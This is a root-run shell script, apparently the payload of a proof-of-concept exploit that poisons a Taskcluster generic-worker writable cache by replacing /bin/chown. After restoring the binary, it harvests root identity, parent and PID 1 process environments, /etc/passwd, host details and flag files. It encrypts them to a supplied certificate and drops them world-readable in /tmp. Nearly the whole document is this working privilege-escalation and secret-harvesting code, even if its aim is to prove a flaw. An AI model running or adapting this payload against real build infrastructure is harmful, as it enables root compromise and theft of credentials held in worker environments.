# This body is appended after a preparation task injects three quoted values:
# ORIGINAL_CHOWN_B64, ORIGINAL_CHOWN_SHA256, and PROOF_CERT_B64.
# The complete file is then persisted as a poisoned writable-cache entry.

set +e
umask 022

restore_tmp="/bin/.chown-taskcluster-$$"
cert_tmp="/tmp/.gw-proof-cert-$$.pem"
proof_tmp="/tmp/.gw-cache-boundary-$$.cms"

cleanup() {
  /bin/rm -f "$restore_tmp" "$cert_tmp" "$proof_tmp" 2>/dev/null
}
trap cleanup EXIT HUP INT TERM

# Restore the original binary before collecting evidence. The temporary file is
# created by this root process, so the atomically restored binary remains
# root-owned. We deliberately do not forward the worker's chown arguments:
# doing so would make the task user the owner of /bin/chown.
if ! printf '%s' "$ORIGINAL_CHOWN_B64" | /usr/bin/base64 --decode >"$restore_tmp"; then
  exit 111
fi
if ! /bin/chmod 0755 "$restore_tmp"; then
  exit 112
fi
if ! /bin/mv -f "$restore_tmp" /bin/chown; then
  exit 113
fi

restored_sha=$(/usr/bin/sha256sum /bin/chown 2>/dev/null | /usr/bin/cut -d ' ' -f 1)
if [ "$restored_sha" != "$ORIGINAL_CHOWN_SHA256" ]; then
  exit 114
fi

owner_arg=${2-unknown:unknown}
task_user=${owner_arg%%:*}
case "$task_user" in
  task_[0-9]*) ;;
  *) task_user="unknown-$$" ;;
esac
proof_file="/tmp/gw-cache-boundary-${task_user}.cms"

if ! printf '%s' "$PROOF_CERT_B64" | /usr/bin/base64 --decode >"$cert_tmp"; then
  exit 0
fi
/bin/chmod 0600 "$cert_tmp" 2>/dev/null

# All sensitive bytes flow directly into CMS encryption. No plaintext proof is
# written to disk or emitted on stdout/stderr.
{
  printf '%s\n' 'proof-version=1'
  printf '%s\n' '[root-identity]'
  /usr/bin/id 2>/dev/null
  printf 'uid='; /usr/bin/id -u 2>/dev/null
  printf 'gid='; /usr/bin/id -g 2>/dev/null
  printf 'user='; /usr/bin/whoami 2>/dev/null

  printf '%s\n' '[wrapper-process-status]'
  if [ -r "/proc/$$/status" ]; then
    /bin/cat "/proc/$$/status"
  fi

  printf '%s\n' '[generic-worker-parent-environ]'
  if [ -r "/proc/$PPID/environ" ]; then
    LC_ALL=C /usr/bin/tr '\000' '\n' <"/proc/$PPID/environ"
  fi

  printf '%s\n' '[pid-1-environ]'
  if [ -r /proc/1/environ ]; then
    LC_ALL=C /usr/bin/tr '\000' '\n' </proc/1/environ
  fi

  printf '%s\n' '[etc-passwd]'
  /bin/cat /etc/passwd 2>/dev/null

  printf '%s\n' '[host]'
  /bin/hostname 2>/dev/null
  /usr/bin/uname -a 2>/dev/null

  printf '%s\n' '[flag-candidates]'
  for flag_path in \
    /flag \
    /flag.txt \
    /root/flag \
    /root/flag.txt \
    /etc/taskcluster/flag \
    /etc/generic-worker/flag \
    /run/secrets/flag
  do
    if [ -f "$flag_path" ] && [ -r "$flag_path" ]; then
      printf '\n--- %s ---\n' "$flag_path"
      /bin/cat "$flag_path"
    fi
  done
} | /usr/bin/openssl cms \
  -encrypt \
  -binary \
  -aes256 \
  -outform DER \
  -out "$proof_tmp" \
  "$cert_tmp" 2>/dev/null

if [ -s "$proof_tmp" ]; then
  /bin/mv -f "$proof_tmp" "$proof_file"
  /bin/chmod 0644 "$proof_file"
fi

exit 0

